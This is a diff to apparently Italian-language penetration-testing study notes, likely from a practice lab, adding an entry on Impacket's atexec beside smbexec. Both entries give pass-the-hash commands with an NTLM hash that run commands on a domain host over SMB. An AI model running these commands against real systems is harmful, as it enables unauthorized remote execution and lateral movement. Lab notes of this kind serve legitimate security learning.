@@ -257,3 +257,8 @@ Non fa upload, ma invece crea un servizio ad ogni richiesta. Usa SMB.
 impacket-smbexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
 ```
 ![[Pasted image 20230907163041.png]]
+- AtExec (Esegue Comandi)
+Usa delle task schedulate per runnare i comandi. Utilizza SMB.
+```bash
+impacket-atexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+```
